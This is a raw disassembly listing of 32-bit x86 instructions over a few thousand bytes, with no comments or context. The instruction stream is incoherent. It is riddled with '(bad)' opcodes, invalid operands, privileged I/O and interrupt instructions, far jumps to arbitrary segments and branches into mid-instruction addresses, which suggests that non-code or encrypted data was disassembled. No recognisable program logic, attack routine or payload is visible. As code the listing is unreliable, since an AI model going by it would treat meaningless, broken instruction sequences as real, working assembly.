  413b4a:	mov    ds:0x5d80b895,al
  413b4f:	daa    
  413b50:	mov    dh,0x7f
  413b52:	and    BYTE PTR [edi],0xee
  413b55:	fdivr  DWORD PTR [ebx+0x7c18672d]
  413b5b:	(bad)  
  413b5c:	mov    edi,0xc038717d
  413b61:	jb     0x413bc5
  413b63:	or     BYTE PTR [edi+eax*2],ah
  413b66:	xlat   BYTE PTR ds:[ebx]
  413b67:	push   es
  413b68:	inc    eax
  413b69:	(bad)  
  413b6a:	and    ebx,DWORD PTR [edx-0x14]
  413b6d:	xor    ebp,DWORD PTR [ecx+0x11]
  413b70:	imul   eax,DWORD PTR [ecx+edx*8-0x44],0xffffffc3
  413b75:	lahf   
  413b76:	adc    DWORD PTR [edi-0x4651d978],ecx
  413b7c:	jp     0x413bb4
  413b7e:	and    DWORD PTR [edx+0x2e],ebp
  413b81:	pop    bp
  413b83:	out    0x3,al
  413b85:	inc    ebx
  413b86:	inc    edx
  413b87:	das    
  413b88:	push   ds
  413b89:	lods   al,BYTE PTR ds:[esi]
  413b8a:	mov    bl,0x4b
  413b8c:	dec    eax
  413b8d:	ins    DWORD PTR es:[edi],dx
  413b8e:	fist   WORD PTR [esi-0x30]
  413b91:	into   
  413b92:	in     eax,dx
  413b93:	call   0xab68:0x3b6a4ef5
  413b9a:	inc    ebp
  413b9b:	xchg   DWORD PTR [esi],ebp
  413b9d:	sub    BYTE PTR [esi],cl
  413b9f:	and    al,0xf7
  413ba1:	les    ecx,FWORD PTR [eax+0x13]
  413ba4:	ja     0x413bf6
  413ba6:	jno    0x413b75
  413ba8:	fist   DWORD PTR [edx]
  413baa:	sbb    edi,DWORD PTR [edx+0x7110cc6c]
  413bb0:	sub    eax,0xc6687bde
  413bb5:	jmp    0x413b83
  413bb7:	loop   0x413be3
  413bb9:	(bad)  
  413bba:	mov    bl,0xf3
  413bbc:	inc    eax
  413bbd:	pop    sp
  413bbf:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  413bc1:	outs   dx,BYTE PTR ds:[esi]
  413bc2:	adc    eax,0x9aa6163a
  413bc7:	dec    esp
  413bc8:	sub    edi,DWORD PTR [ebp+eiz*4-0x8]
  413bcc:	push   eax
  413bcd:	mov    ecx,0x4cf22fa6
  413bd2:	idiv   esi
  413bd4:	daa    
  413bd5:	sub    DWORD PTR [ebx],ebx
  413bd7:	outs   dx,BYTE PTR ds:[esi]
  413bd8:	pop    ebp
  413bd9:	mov    cl,0x5c
  413bdb:	cmp    dl,bh
  413bdd:	retf   
  413bde:	icebp  
  413bdf:	push   0x783c9a95
  413be4:	jp     0x413c2d
  413be6:	mov    ebp,0xf129f043
  413beb:	iret   
  413bec:	pop    ebx
  413bed:	jno    0x413bb1
  413bef:	mov    bh,0x92
  413bf1:	ret    0x99b4
  413bf4:	dec    ecx
  413bf5:	icebp  
  413bf6:	sub    al,0x97
  413bf8:	scas   eax,DWORD PTR es:[edi]
  413bf9:	call   0xd607:0x4dcb836
  413c00:	test   eax,0xbde9735f
  413c05:	sub    dh,BYTE PTR ds:[ecx+0x65]
  413c09:	push   edx
  413c0a:	scas   eax,DWORD PTR es:[edi]
  413c0b:	or     ecx,esi
  413c0d:	xchg   esi,eax
  413c0e:	pop    ecx
  413c0f:	outs   dx,DWORD PTR ds:[esi]
  413c10:	xchg   edx,eax
  413c11:	xorps  xmm7,XMMWORD PTR [ecx-0x27384f8f]
  413c18:	adc    BYTE PTR ds:0x3ab16c89,dl
  413c1e:	pop    esp
  413c1f:	(bad)  
  413c20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c21:	jo     0x413bb6
  413c23:	or     DWORD PTR [edx],edx
  413c25:	dec    edx
  413c26:	fwait
  413c27:	pop    ss
  413c28:	jmp    0x33511372
  413c2d:	mov    esp,0x244ace2f
  413c32:	call   0x382:0x376a4df2
  413c39:	add    al,0x76
  413c3b:	icebp  
  413c3c:	dec    eax
  413c3d:	add    dl,ah
  413c3f:	push   ds
  413c40:	jnp    0x413c6a
  413c42:	icebp  
  413c43:	cmovge esi,ebx
  413c46:	loope  0x413ca5
  413c48:	sub    DWORD PTR [edx],esp
  413c4a:	fdivr  QWORD PTR [ebx-0x8]
  413c4d:	xchg   ecx,eax
  413c4e:	jg     0xa79e361b
  413c54:	inc    ebp
  413c55:	dec    esp
  413c56:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  413c58:	cmp    bh,bl
  413c5a:	push   ss
  413c5b:	imul   DWORD PTR [edx-0x28cb4c2]
  413c61:	repnz sbb ebp,edi
  413c64:	mov    cs,WORD PTR [esi+0x1d]
  413c67:	dec    ecx
  413c68:	pop    ecx
  413c69:	sbb    eax,0xea2da0dc
  413c6e:	scas   al,BYTE PTR es:[edi]
  413c6f:	xor    ecx,esi
  413c71:	cmp    bl,dl
  413c73:	leave  
  413c74:	stc    
  413c75:	and    dh,BYTE PTR [edi-0x3f]
  413c78:	mov    ebx,esp
  413c7a:	test   eax,0x4ad93818
  413c7f:	scas   eax,DWORD PTR es:[edi]
  413c80:	outs   dx,BYTE PTR ds:[esi]
  413c81:	push   eax
  413c82:	xchg   ebp,eax
  413c83:	push   cs
  413c84:	jmp    DWORD PTR [ebx]
  413c86:	ins    BYTE PTR es:[edi],dx
  413c87:	sbb    al,0x78
  413c89:	dec    esi
  413c8a:	sti    
  413c8b:	std    
  413c8c:	pop    ebp
  413c8d:	jl     0x413cd7
  413c8f:	mov    bh,0xe7
  413c91:	sub    al,0x4e
  413c93:	icebp  
  413c94:	inc    esp
  413c95:	iret   
  413c96:	in     eax,dx
  413c97:	or     al,0xbe
  413c99:	sbb    ah,BYTE PTR [esi]
  413c9b:	inc    eax
  413c9c:	ins    BYTE PTR es:[edi],dx
  413c9d:	mov    esi,esi
  413c9f:	adc    DWORD PTR [ebx+0x15af7c04],0x70
  413ca6:	scas   eax,DWORD PTR es:[edi]
  413ca7:	and    BYTE PTR [esp+eiz*2-0x11133524],dl
  413cae:	cdq    
  413caf:	mov    cl,0x3c
  413cb1:	inc    ebx
  413cb2:	aas    
  413cb3:	sar    DWORD PTR ds:0x4a1990fc,cl
  413cb9:	pusha  
  413cba:	popa   
  413cbb:	mov    ds:0xc003e683,al
  413cc0:	arpl   WORD PTR [eax+0x7031b3e5],bx
  413cc6:	test   al,0x1a
  413cc8:	jo     0x413d22
  413cca:	mov    ch,al
  413ccc:	pop    edx
  413ccd:	mov    edx,0x2a7e3c12
  413cd2:	pushf  
  413cd3:	adc    bh,dl
  413cd5:	rcl    DWORD PTR [edi],1
  413cd7:	mov    ebx,0x262b0267
  413cdc:	adc    eax,0x7d7977b4
  413ce1:	sti    
  413ce2:	js     0x413c9d
  413ce4:	sbb    BYTE PTR [edi-0x1ff6bca2],bh
  413cea:	fs xchg esi,eax
  413cec:	pusha  
  413ced:	sbb    esp,ebp
  413cef:	add    eax,0x9e4467af
  413cf4:	mov    cl,0x88
  413cf6:	jb     0x413d04
  413cf8:	mov    dl,0x4
  413cfa:	or     ah,BYTE PTR [edi+0x63]
  413cfd:	sbb    edx,eax
  413cff:	inc    ebp
  413d00:	jno    0x413d1c
  413d02:	inc    ebp
  413d03:	out    dx,eax
  413d04:	and    eax,0xfe8d21ad
  413d09:	ss push ss
  413d0b:	mov    edx,0x9fbcc127
  413d10:	dec    ecx
  413d11:	arpl   si,dx
  413d13:	icebp  
  413d14:	div    edi
  413d16:	add    ebx,eax
  413d18:	out    0x39,eax
  413d1a:	inc    ebx
  413d1b:	mov    esi,0x736aad19
  413d20:	jb     0x413d6f
  413d22:	mov    esi,0xcd28d2f
  413d27:	out    dx,al
  413d28:	mov    bl,0x6e
  413d2a:	retf   
  413d2b:	mov    ah,0x3e
  413d2d:	outs   dx,BYTE PTR ds:[esi]
  413d2e:	std    
  413d2f:	int    0x75
  413d31:	pop    eax
  413d32:	fsubr  st(4),st
  413d34:	imul   esi,DWORD PTR [esi+0x42],0x385a0eef
  413d3b:	or     ebx,DWORD PTR [ecx+0x2f1f17ab]
  413d41:	jge    0x413d08
  413d43:	das    
  413d44:	jp     0x413cde
  413d46:	inc    ecx
  413d47:	dec    esp
  413d48:	jle    0x413d36
  413d4a:	pushf  
  413d4b:	xchg   ebp,eax
  413d4c:	sub    esi,0xffffffa7
  413d4f:	pop    edx
  413d50:	jg     0x413cea
  413d52:	(bad)  
  413d54:	xacquire xchg BYTE PTR [eax-0x181330c5],ah
  413d5b:	or     edi,DWORD PTR [ebp+0x490c4ba6]
  413d61:	iret   
  413d62:	arpl   WORD PTR [ebx-0x6294c8fa],cx
  413d68:	inc    edx
  413d69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d6a:	hlt    
  413d6b:	sub    eax,DWORD PTR [edx]
  413d6d:	inc    ebx
  413d6e:	in     eax,0x70
  413d70:	jmp    0x413d53
  413d72:	cmp    eax,0xe3a6a48
  413d77:	stos   BYTE PTR es:[edi],al
  413d78:	xor    ch,BYTE PTR [ecx+0xc]
  413d7b:	push   ss
  413d7c:	adc    dl,BYTE PTR [eax]
  413d7e:	cmp    eax,0xae21e699
  413d83:	sbb    dh,BYTE PTR [ecx]
  413d85:	xchg   esi,eax
  413d86:	sub    DWORD PTR [eax+0x107077f],edi
  413d8c:	or     eax,0x9163a911
  413d91:	mov    cs,ebp
  413d93:	(bad)  
  413d94:	or     eax,0x15f1dd10
  413d99:	in     eax,0x53
  413d9b:	inc    eax
  413d9c:	lods   eax,DWORD PTR ds:[esi]
  413d9d:	mov    eax,ds:0xfcf73583
  413da2:	stos   DWORD PTR es:[edi],eax
  413da3:	cmp    ebp,edi
  413da5:	hlt    
  413da6:	lock pop DWORD PTR [edi-0x606ea777]
  413dad:	cwde   
  413dae:	push   0x89260e82
  413db3:	xor    DWORD PTR [esi],0x403f17e1
  413db9:	cwde   
  413dba:	xor    DWORD PTR [eax+0x45],ebp
  413dbd:	sar    BYTE PTR [ebp-0xc083aef],0x1
  413dc4:	pop    eax
  413dc5:	add    BYTE PTR [edi-0x12113157],dl
  413dcb:	jb     0x413d74
  413dcd:	jae    0x413df1
  413dcf:	test   al,0xae
  413dd1:	add    DWORD PTR [esi-0x66c328ad],0x8220738d
  413ddb:	fcomp  DWORD PTR [esi+0x1e]
  413dde:	ret    
  413ddf:	jmp    0x413dfa
  413de1:	pop    es
  413de2:	inc    eax
  413de3:	jle    0x413de5
  413de5:	ror    ebp,cl
  413de7:	out    0xc1,al
  413de9:	repz (bad) 
  413deb:	stos   BYTE PTR es:[edi],al
  413dec:	xor    eax,0xb5c17a7
  413df1:	(bad)  [eax-0x542c557a]
  413df7:	into   
  413df8:	mov    ebp,0x4469ca00
  413dfd:	xlat   BYTE PTR ds:[ebx]
  413dfe:	arpl   WORD PTR [esi],dx
  413e00:	into   
  413e01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e02:	sbb    ah,bl
  413e04:	sar    BYTE PTR [edx+ecx*4-0x4],0x64
  413e09:	inc    ecx
  413e0a:	test   BYTE PTR [ebx+0x29],ah
  413e0d:	inc    esi
  413e0e:	ror    DWORD PTR [esi],0x33
  413e11:	push   cs
  413e12:	retf   
  413e13:	std    
  413e14:	sbb    bl,cl
  413e16:	mov    bl,0xca
  413e18:	stos   BYTE PTR es:[edi],al
  413e19:	mov    es,esi
  413e1b:	push   0x5e5f6a88
  413e20:	adc    ecx,DWORD PTR [ebp+0x72]
  413e23:	fldcw  WORD PTR [ebp-0x6b6ce922]
  413e29:	or     ebx,DWORD PTR [esi-0x421d470f]
  413e2f:	and    al,0x6f
  413e31:	retf   0x86b3
  413e34:	shl    DWORD PTR [eax-0x10297444],0xde
  413e3b:	xchg   ebp,eax
  413e3c:	jmp    0xc19e:0x5075994b
  413e43:	mov    dh,0x1b
  413e45:	xchg   dh,dl
  413e47:	pop    esi
  413e48:	arpl   WORD PTR [edi+ebp*1-0xd],sp
  413e4c:	sub    eax,0xc0f6ab3f
  413e51:	data16 fisub WORD PTR [ebx+0x7d]
  413e55:	inc    ebx
  413e56:	ror    ecx,0xc7
  413e59:	jmp    0x413ece
  413e5b:	lds    eax,FWORD PTR [edi]
  413e5d:	ret    0xd647
  413e60:	or     DWORD PTR [edi+0x6c],esi
  413e63:	pop    eax
  413e64:	ja     0x413ed6
  413e66:	xchg   edx,eax
  413e67:	repz aas 
  413e69:	sbb    al,0xc0
  413e6b:	jno    0x413ea2
  413e6d:	sub    BYTE PTR [edx-0xb],bh
  413e70:	xchg   ebx,eax
  413e71:	imul   eax,DWORD PTR [edi],0xfffffff0
  413e74:	xor    eax,0xa171ad85
  413e79:	scas   al,BYTE PTR es:[edi]
  413e7a:	push   edi
  413e7b:	icebp  
  413e7c:	sub    eax,eax
  413e7e:	adc    eax,0xb0bd8cb6
  413e83:	dec    ebx
  413e84:	enter  0x8175,0x73
  413e88:	sti    
  413e89:	sar    BYTE PTR [ecx],1
  413e8b:	xchg   DWORD PTR [edi+0x49],ebx
  413e8e:	inc    esp
  413e8f:	mov    esi,0x132b2dce
  413e94:	in     al,dx
  413e95:	push   ss
  413e96:	adc    eax,0x4e43dcd9
  413e9b:	xchg   esp,eax
  413e9c:	mov    WORD PTR [edx+ebp*2],fs
  413e9f:	xor    DWORD PTR [edi],0x75
  413ea2:	sahf   
  413ea3:	inc    esp
  413ea4:	out    0x72,eax
  413ea6:	xchg   esi,eax
  413ea7:	ins    DWORD PTR es:[edi],dx
  413ea8:	scas   eax,DWORD PTR es:[edi]
  413ea9:	lds    esp,FWORD PTR es:[ebp-0x58]
  413ead:	push   edx
  413eae:	and    al,0x93
  413eb0:	or     DWORD PTR [eax+0x55],ecx
  413eb3:	cmp    esp,DWORD PTR [ecx-0x1bb3267b]
  413eb9:	aam    0x10
  413ebb:	pusha  
  413ebc:	mul    BYTE PTR [ebp+0x70]
  413ebf:	not    DWORD PTR [edx]
  413ec1:	and    esp,DWORD PTR [edi-0x3f0cd454]
  413ec7:	bound  edx,QWORD PTR [edx+0x7e]
  413eca:	push   ecx
  413ecb:	jbe    0x413ea3
  413ecd:	pop    esi
  413ece:	mov    ebp,DWORD PTR ds:0xf8688b92
  413ed4:	in     eax,dx
  413ed5:	(bad)  
  413ed7:	cmp    bl,BYTE PTR [ebx-0x7fad0923]
  413edd:	pushf  
  413ede:	jle    0x413f3c
  413ee0:	mov    ch,0x44
  413ee2:	jae    0x413eed
  413ee4:	enter  0x30c0,0x5
  413ee8:	gs hlt 
  413eea:	loope  0x413e9d
  413eec:	gs inc ecx
  413eee:	pop    es
  413eef:	fisttp DWORD PTR [edx+0x3f14900e]
  413ef5:	retf   0xa195
  413ef8:	jl     0x413f2e
  413efa:	add    DWORD PTR [ebp+0x7],edi
  413efd:	mov    edx,0x5848551e
  413f02:	fld    QWORD PTR [ecx-0x610f3440]
  413f08:	mov    WORD PTR [ebx+eax*1],cs
  413f0b:	mov    ah,bl
  413f0d:	sahf   
  413f0e:	ror    DWORD PTR [esi-0x12beba90],cl
  413f14:	(bad)
  413f17:	jle    0x413f8c
  413f19:	xchg   ecx,eax
  413f1a:	neg    DWORD PTR [edx-0x5591013e]
  413f20:	mov    ch,BYTE PTR [ecx+ebp*8]
  413f23:	xchg   esi,eax
  413f24:	lods   al,BYTE PTR ds:[esi]
  413f25:	aam    0x2b
  413f27:	cdq    
  413f28:	aad    0x22
  413f2a:	ret    0xa331
  413f2d:	and    dl,dl
  413f2f:	(bad)
  413f33:	jle    0x413f6c
  413f35:	jne    0x413f55
  413f37:	xchg   DWORD PTR [eax+0x25],ebp
  413f3a:	xor    ebp,DWORD PTR [eax]
  413f3c:	push   edx
  413f3d:	mov    dl,0x3
  413f3f:	xor    al,0xbf
  413f41:	jle    0x413eed
  413f43:	enter  0x78e7,0x6e
  413f47:	jbe    0x413fbf
  413f49:	inc    ebx
  413f4a:	cmc    
  413f4b:	add    ecx,DWORD PTR [edi-0x227f4c69]
  413f51:	popa   
  413f52:	es jl  0x413f9a
  413f55:	loopne 0x413fc8
  413f57:	sub    al,0x23
  413f59:	imul   edx,ecx,0x1907a9
  413f5f:	psubd  mm3,QWORD PTR [eax+0x7b681de9]
  413f66:	pushf  
  413f67:	in     eax,dx
  413f68:	sub    DWORD PTR [ecx],esp
  413f6a:	push   eax
  413f6b:	(bad)  
  413f6d:	xor    DWORD PTR [edx+edi*1+0x79],ebx
  413f71:	rol    BYTE PTR [ebp+edx*8-0x54be3e0c],cl
  413f78:	adc    eax,0x3fd26cdc
  413f7d:	ins    DWORD PTR es:[edi],dx
  413f7e:	test   al,0x1c
  413f80:	inc    ebx
  413f81:	jmp    0x413f70
  413f83:	cmc    
  413f84:	jp     0x413f1a
  413f86:	mov    WORD PTR [ebp+eiz*1-0x3a],ds
  413f8a:	xchg   ecx,eax
  413f8b:	(bad)  
  413f8c:	pop    ecx
  413f8d:	push   edx
  413f8e:	xchg   edx,eax
  413f8f:	sbb    al,0x6a
  413f91:	mov    edi,DWORD PTR [edx+0x1c]
  413f94:	pop    ecx
  413f95:	addr16 adc eax,0x9d404b24
  413f9b:	scas   eax,DWORD PTR es:[edi]
  413f9c:	and    dh,al
  413f9e:	mov    ds:0x4b14180,al
  413fa3:	add    DWORD PTR [edi-0xefbcd1e],edx
  413fa9:	cmp    BYTE PTR [edi],al
  413fab:	xchg   ebx,eax
  413fac:	jb     0x413f7a
  413fae:	pusha  
  413faf:	scas   al,BYTE PTR es:[edi]
  413fb0:	mov    ebx,0x6bb62652
  413fb5:	enter  0x95ba,0x44
  413fb9:	fsubr  DWORD PTR [ecx+0x27]
  413fbc:	(bad)  
  413fbe:	inc    ebx
  413fbf:	das    
  413fc0:	jb     0x414037
  413fc2:	push   es
  413fc3:	adc    DWORD PTR [ebp-0x31],edi
  413fc6:	mov    ?,WORD PTR [ebx+ebp*1-0x7d]
  413fca:	imul   eax,DWORD PTR cs:[edx],0x3a5dcf45
  413fd1:	out    dx,al
  413fd2:	jae    0x413fcb
  413fd4:	xchg   esp,eax
  413fd5:	or     DWORD PTR [eax-0x19],esi
  413fd8:	out    dx,eax
  413fd9:	or     al,0xc4
  413fdb:	fwait
  413fdc:	in     eax,dx
  413fdd:	lods   eax,DWORD PTR ds:[esi]
  413fde:	fsubr  st,st(5)
  413fe0:	jne    0x413fd0
  413fe2:	stos   BYTE PTR es:[edi],al
  413fe3:	imul   BYTE PTR [edi+0x59f97e51]
  413fe9:	inc    ebx
  413fea:	div    DWORD PTR [edx]
  413fec:	xchg   ecx,eax
  413fed:	clc    
  413fee:	int3   
  413fef:	popf   
  413ff0:	mov    cl,0x54
  413ff2:	mov    ebx,0xaeb70995
  413ff7:	popa   
  413ff8:	sbb    BYTE PTR ds:0xb1b8fe5e,bh
  413ffe:	xchg   ecx,eax
  413fff:	call   FWORD PTR [edx-0x4b1fec42]
  414005:	inc    ebx
  414006:	mov    eax,ds:0x6e5e8b4f
  41400b:	aaa    
  41400c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41400d:	and    BYTE PTR [edx-0x36],0x9f
  414011:	nop
  414012:	je     0x413fc7
  414014:	jmp    0xa442:0x79a1439c
  41401b:	xor    eax,0x31bda0c6
  414020:	cdq    
  414021:	mov    ds:0x6d041c15,al
  414026:	cli    
  414027:	fadd   DWORD PTR [edi+0x4e]
  41402a:	out    0x41,al
  41402c:	(bad)  
  41402d:	fsub   QWORD PTR [ebx+0x46ef6c75]
  414033:	inc    esp
  414034:	inc    edi
  414035:	jo     0x414060
  414037:	dec    edx
  414038:	mov    al,ds:0xb2ac1e68
  41403d:	mov    ds:0x9c11a041,eax
  414042:	sbb    BYTE PTR [eax],ch
  414044:	mov    BYTE PTR [edx-0x20d2a93],0xad
  41404b:	and    dh,BYTE PTR [esi+0x37]
  41404e:	ret    0xadde
  414051:	or     BYTE PTR [esi-0x27],ah
  414054:	lea    eax,[ebx+0x3455309d]
  41405a:	test   DWORD PTR [ecx-0x6d],ebx
  41405d:	add    al,0x63
  41405f:	cmp    al,0xb
  414061:	imul   esp,DWORD PTR [eax-0x68],0x9eb2a093
  414068:	adc    al,0xfb
  41406a:	out    0x2e,al
  41406c:	shl    BYTE PTR [edx-0x57],cl
  41406f:	stc    
  414070:	(bad)  
  414071:	jae    0x413ff3
  414073:	(bad)  
  414074:	dec    ebx
  414075:	cmp    eax,0xeb02bcb9
  41407a:	pop    esi
  41407b:	adc    bl,BYTE PTR [ebx]
  41407d:	in     al,dx
  41407e:	mov    al,0x6
  414080:	sub    dh,BYTE PTR [edx+ecx*8+0x3a419c69]
  414087:	and    eax,0x24dc9af8
  41408c:	mov    ecx,0x1f409069
  414091:	dec    ebp
  414092:	arpl   WORD PTR [edi],si
  414094:	jb     0x4140b7
  414096:	test   al,0x84
  414098:	in     al,dx
  414099:	mov    ebp,0x5d005a9b
  41409e:	xchg   edi,eax
  41409f:	push   ss
  4140a0:	mov    ?,WORD PTR [eax]
  4140a2:	jecxz  0x41404f
  4140a4:	xor    al,0xc8
  4140a6:	sub    edi,esi
  4140a8:	jno    0x4140c7
  4140aa:	(bad)  
  4140ab:	mov    edi,0xe54a7907
  4140b0:	xchg   esi,eax
  4140b1:	sub    al,0x5
  4140b3:	jne    0x4140a3
  4140b5:	adc    edi,0xecde911e
  4140bb:	and    ecx,DWORD PTR [eax]
  4140bd:	jne    0x41411c
  4140bf:	push   ebp
  4140c0:	das    
  4140c1:	xor    DWORD PTR [ecx],esi
  4140c3:	fs jg  0x41411d
  4140c6:	mov    bl,dl
  4140c8:	dec    edx
  4140c9:	sbb    BYTE PTR [ecx+0x63],cl
  4140cc:	popa   
  4140cd:	mov    bh,0x52
  4140d0:	mov    edx,0xad4f73cf
  4140d5:	lea    ebp,[ebx+eax*1-0x6e]
  4140d9:	jle    0x4140d9
  4140db:	out    dx,al
  4140dc:	adc    ah,BYTE PTR [ebp-0x77f767c3]
  4140e2:	mov    DWORD PTR [edi-0x6d],ebx
  4140e5:	cmp    BYTE PTR [edi],dh
  4140e7:	jo     0x414076
  4140e9:	sbb    al,0xac
  4140eb:	mov    edx,0xd930f8b8
  4140f0:	cmc    
  4140f1:	je     0x4140ba
  4140f3:	pop    ebx
  4140f4:	imul   BYTE PTR [edi+0x24d7262f]
  4140fa:	jbe    0x4140e5
  4140fc:	dec    esi
  4140fd:	daa    
  4140fe:	add    cl,dl
  414100:	mov    eax,0xbeb7a68d
  414105:	or     edx,DWORD PTR [ecx+0x2c]
  414108:	jle    0x41409d
  41410a:	xor    al,ah
  41410c:	shl    BYTE PTR [esi],1
  41410e:	sub    esi,eax
  414110:	jle    0x41415e
  414112:	cmp    eax,0x18c45601
  414117:	and    DWORD PTR [edi],edi
  414119:	mov    ebp,0x20cec975
  41411e:	aaa    
  41411f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414120:	sub    DWORD PTR [edx+ecx*1],esp
  414123:	fiadd  WORD PTR [eax+eiz*8]
  414126:	and    DWORD PTR [edi+0x7c80d2f0],0xffffff81
  41412d:	(bad)  
  41412f:	mov    esp,0xcad82005
  414134:	sbb    eax,0xfb0a87f1
  414139:	and    bl,BYTE PTR [edi+0x69]
  41413c:	lds    ebp,FWORD PTR [edx+0x35dde96d]
  414142:	xor    DWORD PTR [ebp-0x47b6c4d4],edi
  414148:	xchg   BYTE PTR [edx],dl
  41414a:	into   
  41414b:	inc    esp
  41414c:	and    esi,DWORD PTR [eax]
  41414e:	adc    bh,BYTE PTR ds:0xe59310b6
  414154:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414155:	fstp   TBYTE PTR [ebp+0x7d]
  414158:	aas    
  414159:	jnp    0x41411f
  41415b:	mov    cl,0xd5
  41415d:	mov    WORD PTR [edi],?
  41415f:	or     BYTE PTR ds:0xf0826e2c,ch
  414165:	leave  
  414166:	jno    0x414162
  414168:	mov    ch,0xa9
  41416a:	dec    eax
  41416b:	mov    bl,0x64
  41416d:	push   cs
  41416e:	rcl    edi,cl
  414170:	mov    ebx,esi
  414172:	shl    BYTE PTR [esi+0x67f299ce],cl
  414178:	pop    eax
  414179:	xchg   BYTE PTR [ecx-0x7e743d31],bh
  41417f:	pop    es
  414180:	mov    ds:0xd6b345e1,al
  414185:	mov    WORD PTR [ebp*2+0x5026a6b2],?
  41418c:	jo     0x4141c9
  41418e:	in     eax,dx
  41418f:	cmp    cl,bl
  414191:	aad    0x70
  414193:	fs jp  0x41411a
  414196:	push   edx
  414197:	adc    DWORD PTR [edx],edx
  414199:	dec    ebp
  41419a:	in     eax,dx
  41419b:	xor    al,0x34
  41419e:	mov    edi,0x910f0b51
  4141a3:	inc    ebp
  4141a4:	rcl    BYTE PTR [ebp+0x1a],0xda
  4141a8:	and    DWORD PTR [ebx+0x4a326b0f],esi
  4141ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141af:	icebp  
  4141b0:	pusha  
  4141b1:	and    BYTE PTR [eax-0x54],0xa9
  4141b5:	ins    BYTE PTR es:[edi],dx
  4141b6:	sti    
  4141b7:	aam    0x5b
  4141b9:	and    DWORD PTR [ebx],esp
  4141bb:	inc    ecx
  4141bc:	sbb    esi,DWORD PTR [ecx+edx*4+0x6e]
  4141c0:	xor    ch,BYTE PTR [esi]
  4141c2:	cmp    BYTE PTR [eax+0x4e17f886],ah
  4141c8:	dec    esi
  4141c9:	cs stos DWORD PTR es:[edi],eax
  4141cb:	(bad)  
  4141cc:	mov    esi,0xdf165938
  4141d1:	push   ss
  4141d2:	or     al,0x9a
  4141d4:	jbe    0x414209
  4141d6:	std    
  4141d7:	inc    eax
  4141d8:	xchg   ebx,eax
  4141d9:	inc    edx
  4141da:	xchg   esi,eax
  4141db:	push   0x5e023baf
  4141e0:	into   
  4141e1:	and    edx,DWORD PTR [ebp-0x55277db]
  4141e7:	add    dh,ch
  4141e9:	pop    ebp
  4141ea:	sbb    DWORD PTR [ebx+0x5f],eax
  4141ed:	and    cl,BYTE PTR [eax-0x45]
  4141f0:	icebp  
  4141f1:	retf   
  4141f2:	push   ebp
  4141f3:	pop    es
  4141f4:	xchg   ebx,eax
  4141f5:	in     al,0xe0
  4141f7:	ins    BYTE PTR es:[edi],dx
  4141f8:	loopne 0x414188
  4141fa:	rol    BYTE PTR [eax-0x65],0xe5
  4141fe:	popf   
  4141ff:	sbb    al,0xaf
  414201:	cmp    ah,BYTE PTR [ecx]
  414203:	push   0xc3bbc91b
  414208:	stos   DWORD PTR es:[edi],eax
  414209:	(bad)  
  41420a:	shl    BYTE PTR [ebp+0x208c1906],1
  414210:	mov    edi,0xe4e1d79e
  414215:	mov    eax,ds:0x1f82fa13
  41421a:	retf   
  41421b:	cdq    
  41421c:	hlt    
  41421d:	and    ebp,DWORD PTR [ebx-0x30d7caac]
  414223:	mov    edx,0xced926af
  414228:	add    edx,DWORD PTR [ecx]
  41422a:	mov    DWORD PTR [ecx+0x517938ee],ebx
  414230:	mov    dl,0xa7
  414232:	mov    ah,0x16
  414234:	retf   
  414235:	leave  
  414236:	xchg   esi,eax
  414237:	popa   
  414238:	mov    bh,0xd4
  41423a:	sub    DWORD PTR es:[edi],ecx
  41423d:	mov    ah,0xb
  41423f:	jo     0x414204
  414241:	or     al,bl
  414243:	adc    dh,bl
  414245:	cmp    eax,0x2648afa3
  41424a:	fst    QWORD PTR [esi+eax*2+0x3]
  41424e:	call   0x8b86837a
  414253:	adc    DWORD PTR [eax],0xf294f8a0
  414259:	jne    0x414230
  41425b:	or     al,0x20
  41425d:	push   es
  41425e:	xchg   ebx,eax
  41425f:	dec    bp
  414261:	(bad)  
  414263:	pop    ebp
  414264:	cmp    eax,0x42725733
  414269:	push   edi
  41426a:	cmp    eax,0xe3a85be5
  41426f:	mov    eax,ds:0x887f1110
  414274:	jle    0x414263
  414276:	add    bh,dl
  414278:	call   0x86dee4c6
  41427d:	imul   esp,ebx,0xfaeb9b8f
  414283:	pushf  
  414284:	je     0x414224
  414286:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414287:	jb     0x4142f4
  414289:	and    bl,BYTE PTR [edi-0x77dc7da7]
  41428f:	jge    0x414288
  414291:	loope  0x4142c5
  414293:	push   es
  414294:	daa    
  414295:	add    BYTE PTR [ecx-0x5dfa785e],cl
  41429b:	sub    bl,BYTE PTR [eax]
  41429d:	inc    edi
  41429e:	popf   
  41429f:	rol    bl,0xa3
  4142a2:	push   0xffffffed
  4142a4:	dec    ebp
  4142a5:	test   BYTE PTR [edi+0x42],bh
  4142a8:	pusha  
  4142a9:	cdq    
  4142aa:	mov    dl,0xa6
  4142ac:	jb     0x4142a1
  4142ae:	imul   esi,edx,0xcdc7ed77
  4142b4:	ss sti 
  4142b6:	pop    DWORD PTR [eax+0x250ee315]
  4142bc:	out    dx,eax
  4142bd:	pop    esp
  4142be:	stos   BYTE PTR es:[edi],al
  4142bf:	push   cs
  4142c0:	mov    edi,0xbbe46a5d
  4142c5:	sbb    BYTE PTR [edx-0x7fc83ce],bh
  4142cb:	mov    edi,0x6a363d31
  4142d0:	out    dx,eax
  4142d1:	ja     0x4142d0
  4142d3:	repz cmps DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4142d6:	mov    es,WORD PTR [edi-0x42]
  4142d9:	scas   al,BYTE PTR es:[edi]
  4142da:	mov    ds:0xcf6de56b,al
  4142df:	mov    cl,0xaf
  4142e1:	jmp    0x41431d
  4142e3:	mov    al,0xba
  4142e5:	fisttp DWORD PTR [ebx+0xd48c040]
  4142eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142ec:	mov    edx,0x4ad2647b
  4142f1:	mov    dl,ah
  4142f3:	jno    0x41435e
  4142f5:	not    DWORD PTR [edx+0x16]
  4142f8:	push   eax
